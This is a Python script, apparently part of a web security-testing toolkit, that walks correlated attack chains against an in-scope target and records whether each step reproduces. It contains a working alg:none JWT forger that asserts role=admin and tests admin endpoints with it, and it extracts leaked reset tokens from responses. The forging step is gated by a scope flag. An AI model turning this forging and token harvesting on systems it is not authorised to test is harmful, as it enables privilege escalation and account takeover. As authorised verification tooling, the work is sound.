#!/usr/bin/env python3
"""Phase D — attack-chain execution (verification of correlated chains).

Walks each correlated chain's steps IN ORDER, carrying extracted state between them, using the
real actor sessions. A chain only becomes confidence=confirmed when every step reproduces and the
data actually flows end-to-end. Read-only by default.

The single active capability is token *forging*: for a privilege step that grants
identity:assume-admin via an unsigned/forgeable token, the tool can mint an `alg:none` token with
role=admin and send it to an admin endpoint to OBSERVE whether the server accepts it. This is the
proof that the escalation is real. It NEVER persists anything and runs ONLY when the scope sets
`allow_token_forge: true` (default false) — otherwise that step is left unexecuted and the chain
stays tentative with a note saying what is needed. GET-only; scope, deny-list and rate limit apply.
"""
import argparse
import base64
import json
import os
import re
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from common import Client, load_scope_or_exit, load_sessions, redact, redact_url, now_iso  # noqa: E402

DENIAL = re.compile(r"(?i)\b(unauthori[sz]ed|forbidden|403|401|admin only|access denied|not allowed)\b")
TOKEN_RE = re.compile(r'(?i)"?(?:reset_token|token|code|otp)"?\s*[:=]\s*"?([A-Za-z0-9._\-]{6,})')


def _b64u(d: dict) -> str:
    return base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b"=").decode()


def forge_none_admin(orig_payload: dict | None = None) -> str:
    """Craft an unsigned (alg:none) JWT asserting role=admin. Used only to observe server trust."""
    payload = dict(orig_payload or {})
    payload["role"] = "admin"
    payload.setdefault("sub", "chain-exec-probe")
    return _b64u({"alg": "none", "typ": "JWT"}) + "." + _b64u(payload) + "."


def finding_by_id(findings: list, fid: str) -> dict | None:
    for f in findings:
        if f.get("id") == fid:
            return f
    return None


def recon_admin_targets(out_dir: str, scope) -> list:
    """Admin-looking in-scope URLs from any recon*.json, for the forge-observation step."""
    targets, seen = [], set()
    for name in os.listdir(out_dir):
        if not (name.startswith("recon") and name.endswith(".json")):
            continue
        try:
            doc = json.load(open(os.path.join(out_dir, name), encoding="utf-8"))
        except Exception:  # noqa: BLE001
            continue
        cands = []
        for pg in doc.get("pages", []):
            cands.append(pg.get("url", ""))
        cands += doc.get("js_endpoints", []) + doc.get("js_absolute_urls", [])
        cands += [t.get("template", "") for t in doc.get("endpoint_templates", [])]
        for u in cands:
            if not u:
                continue
            full = u if "//" in u else scope.target + ("" if u.startswith("/") else "/") + u
            full = full.replace("{id}", "1")
            if "admin" in full.lower() and scope.in_scope(full) and not scope.excluded(full) and full not in seen:
                seen.add(full)
                targets.append(full)
    return targets


def pick_client(step_finding, clients, anon):
    ctx = (step_finding or {}).get("auth_context", "anonymous")
    return clients.get(ctx, anon)


def execute_chain(chain, findings, clients, anon, scope, out_dir):
    state = {"artifacts": {}}
    steps_log, evidence_refs, actor_path = [], [], []
    confirmed = 0
    forge_pending = False
    for step in chain.get("kill_chain", []):
        fid = step.get("finding")
        f = finding_by_id(findings, fid)
        grants = set((f or {}).get("grants", []))
        url = (f or {}).get("url", "")
        # The active forge step: privilege escalation via a forgeable token.
        if grants & {"identity:assume-admin"} and (f or {}).get("chain_role") == "privilege":
            if not scope.allow_token_forge:
                forge_pending = True
                steps_log.append(f"step {step['step']} ({fid}): forge NOT executed — set allow_token_forge:true in scope to confirm")
                actor_path.append("forged-admin(skipped)")
                continue
            accepted = None
            forged = forge_none_admin()
            for tgt in recon_admin_targets(out_dir, scope) or ([url] if url and scope.in_scope(url) else []):
                # Differential test: the endpoint must DENY with no token, then ACCEPT the forged
                # one. An endpoint that is already open to anyone is a separate BFLA finding, not
                # proof that forging the role worked — skip it here.
                base = anon.get(tgt)
                base_denied = base is not None and (base.status_code in (401, 403) or DENIAL.search(base.text[:400]))
                if not base_denied:
                    continue
                r = anon.get(tgt, headers={"Authorization": f"Bearer {forged}", "Cookie": f"guest_token={forged}"})
                if r is not None and 200 <= r.status_code < 300 and not DENIAL.search(r.text[:400]):
                    accepted = tgt
                    evidence_refs.append(f"{redact_url(tgt)}: no token -> {base.status_code}, "
                                         f"forged alg:none role=admin -> {r.status_code} (escalation confirmed)")
                    break
            actor_path.append("forged-admin")
            if accepted:
                confirmed += 1
                steps_log.append(f"step {step['step']} ({fid}): server ACCEPTED forged admin token at {redact_url(accepted)}")
            else:
                steps_log.append(f"step {step['step']} ({fid}): forged token not accepted by any admin endpoint (no escalation confirmed)")
            continue
        # Read-only reproduction of a disclosure/authz/session step.
        if not url or not scope.in_scope(url) or scope.excluded(url):
            steps_log.append(f"step {step['step']} ({fid}): skipped (no reproducible in-scope URL)")
            continue
        client = pick_client(f, clients, anon)
        actor_path.append(client.name)
        r = client.get(url)
        if r is None:
            steps_log.append(f"step {step['step']} ({fid}): request failed")
            continue
        body = r.text[:1500]
        ok = 200 <= r.status_code < 400
        if ok:
            confirmed += 1
            # Extract any artifact the next step may consume (reset token, id).
            m = TOKEN_RE.search(body)
            if m:
                state["artifacts"]["token"] = m.group(1)
            steps_log.append(f"step {step['step']} ({fid}): reproduced ({r.status_code})"
                             + (" — extracted token" if m else ""))
            evidence_refs.append(f"{redact_url(url)} -> {r.status_code}")
        else:
            steps_log.append(f"step {step['step']} ({fid}): did not reproduce ({r.status_code})")
    total = len(chain.get("kill_chain", []))
    all_ok = confirmed == total and not forge_pending
    chain["verification"] = {
        "executed": True,
        "actor_path": actor_path,
        "steps": steps_log,
        "evidence_refs": evidence_refs,
        "notes": ("Walked end-to-end read-only; forged token observed only (never persisted)."
                  if not forge_pending else
                  "Read-only steps reproduced; privilege step requires allow_token_forge to confirm."),
        "at": now_iso(),
    }
    if all_ok:
        chain["confidence"] = "confirmed"
    return confirmed, total, forge_pending


def main():
    ap = argparse.ArgumentParser(description="Execute/verify correlated attack chains end-to-end (read-only; forge gated).")
    ap.add_argument("--scope", required=True)
    ap.add_argument("--out", required=True)
    ap.add_argument("--chains", required=True)
    ap.add_argument("--findings", required=True)
    ap.add_argument("--sessions")
    ap.add_argument("--chain", help="only this CHAIN-id")
    a = ap.parse_args()
    scope = load_scope_or_exit(a.scope)
    try:
        chains_doc = json.load(open(a.chains, encoding="utf-8"))
        findings = json.load(open(a.findings, encoding="utf-8")).get("findings", [])
    except (OSError, json.JSONDecodeError) as e:
        sys.exit(f"Cannot read inputs: {e}")
    sessions = load_sessions(a.sessions)
    anon = Client(scope, a.out, "anonymous")
    clients = {"anonymous": anon}
    for name in ("user_a", "user_b", "admin"):
        if name in sessions:
            clients[name] = Client(scope, a.out, name, sessions[name])
    # cross-user / cross-role aliases map onto the owner session heuristically
    clients.setdefault("cross-user", clients.get("user_b", anon))
    clients.setdefault("cross-role", clients.get("user_a", anon))

    chosen = [c for c in chains_doc.get("chains", []) if not a.chain or c.get("id") == a.chain]
    if not chosen:
        print("No matching chains to execute."); return
    if not scope.allow_token_forge:
        print("note: allow_token_forge is false — privilege/forge steps are observed-only-OFF (read-only walk).")
    try:
        for c in chosen:
            k, n, pending = execute_chain(c, findings, clients, anon, scope, a.out)
            state = c.get("confidence")
            print(f"  {c['id']} | {state} | {k}/{n} steps reproduced"
                  + (" | forge step gated (allow_token_forge off)" if pending else ""))
    finally:
        tmp = a.chains + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(chains_doc, f, indent=2)
        os.replace(tmp, a.chains)
    print(f"Chain execution: {len(chosen)} chain(s) processed -> {a.chains}")


if __name__ == "__main__":
    main()
